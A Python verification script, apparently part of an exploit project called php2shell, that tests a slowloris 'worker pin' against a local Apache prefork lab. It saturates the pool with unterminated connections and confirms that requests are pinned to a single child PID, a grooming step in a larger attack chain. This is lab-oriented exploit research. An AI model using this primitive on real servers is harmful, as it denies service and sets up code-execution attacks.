#!/usr/bin/env python3
"""Decisive, exploit-independent proof of the slowloris worker-pin (WorkerPin in
php2shell.py) against the 10-child apache-pool lab.

It isolates the pinning primitive from full-chain reliability by hitting pid.php
(which echoes the serving prefork child's PID) two ways:

  CONTROL  - no pin: ~30 concurrent requests scatter across several distinct PIDs
             (and confirm the pool really has multiple live children).
  TEST     - pin engaged: open 10 unterminated slowloris holders, probe that the
             pool is saturated, release exactly one child, then fire ~30
             `Connection: close` requests -> they all return the SAME single PID.

One-PID-under-pin vs. many-PIDs-without is the proof.

stdlib only; run isolated:  python3 -I poc/verify_worker_pin.py [host] [port] [workers]
Defaults: 127.0.0.1 8093 10 (the apache-pool compose service)."""
import os
import socket
import sys
import threading
import time

# Import the real WorkerPin so the test exercises the shipped primitive, not a
# copy. -I drops the script dir from sys.path, so add it back explicitly (poc/
# is our own trusted code).
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from primitives.groom.worker_pin import WorkerPin  # noqa: E402


def fetch_pid(host, port, timeout=10):
    """GET /pid.php with Connection: close over a raw socket; return the child's
    PID (int) or None on error/non-numeric body."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        try:
            s.sendall(b"GET /pid.php HTTP/1.1\r\nHost: " + host.encode() +
                      b"\r\nConnection: close\r\n\r\n")
            buf = bytearray()
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                buf.extend(chunk)
        finally:
            s.close()
    except OSError:
        return None
    body = bytes(buf).split(b"\r\n\r\n", 1)
    if len(body) != 2:
        return None
    digits = body[1].strip()
    return int(digits) if digits.isdigit() else None


def fire(host, port, n, concurrency):
    """Fire n pid.php requests with the given concurrency; return the PID list."""
    pids = []
    lock = threading.Lock()
    pending = list(range(n))
    idx = [0]

    def worker():
        while True:
            with lock:
                if idx[0] >= n:
                    return
                idx[0] += 1
            pid = fetch_pid(host, port)
            with lock:
                pids.append(pid)

    threads = [threading.Thread(target=worker) for _ in range(concurrency)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return pids


def summarize(pids):
    counts = {}
    for p in pids:
        counts[p] = counts.get(p, 0) + 1
    ok = [p for p in pids if p is not None]
    distinct = sorted(k for k in counts if k is not None)
    return counts, ok, distinct


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8093
    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 10

    print(f"[verify] target {host}:{port}, pool size {workers}")
    if fetch_pid(host, port) is None:
        raise SystemExit(f"[verify] pid.php did not answer on {host}:{port} - is "
                         f"the apache-pool service up? "
                         f"(docker compose up -d --build apache-pool)")

    print(f"\n[CONTROL] no pin: 30 requests, concurrency {workers}")
    c_counts, c_ok, c_distinct = summarize(fire(host, port, 30, workers))
    print(f"[CONTROL] distinct PIDs: {len(c_distinct)} -> {c_distinct}")
    print(f"[CONTROL] distribution: "
          f"{ {p: c_counts[p] for p in c_distinct} } "
          f"(failed: {c_counts.get(None, 0)})")

    print(f"\n[TEST] engaging the pin: {workers} slowloris holders")
    pin = WorkerPin(host, port, workers)
    try:
        held = pin.pin()
        sat = pin.probe_saturated()
        print(f"[TEST] opened {held} holders; probe_saturated={sat}")
        if not sat:
            pin.release()
            raise SystemExit(f"[TEST] pool did not saturate with {held} holders - "
                             f"the pool is larger than {workers}; raise the "
                             f"workers arg to MaxRequestWorkers")
        pin.release_one()
        print(f"[TEST] released exactly one child ({len(pin.held)} still held); "
              f"firing 30 Connection: close requests")
        t_counts, t_ok, t_distinct = summarize(fire(host, port, 30, 4))
    finally:
        pin.release()
    print(f"[TEST] distinct PIDs: {len(t_distinct)} -> {t_distinct}")
    print(f"[TEST] distribution: "
          f"{ {p: t_counts[p] for p in t_distinct} } "
          f"(failed: {t_counts.get(None, 0)})")

    print("\n[verify] VERDICT:")
    control_scatters = len(c_distinct) > 1
    test_pins = len(t_distinct) == 1 and len(t_ok) > 0
    print(f"  control scattered across >1 child: {control_scatters} "
          f"({len(c_distinct)} PIDs)")
    print(f"  pinned to exactly one child:       {test_pins} "
          f"({len(t_distinct)} PID)")
    if control_scatters and test_pins:
        print("[verify] PASS - the slowloris pin collapses the pool to one worker.")
        return 0
    print("[verify] INCONCLUSIVE - see the distributions above.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
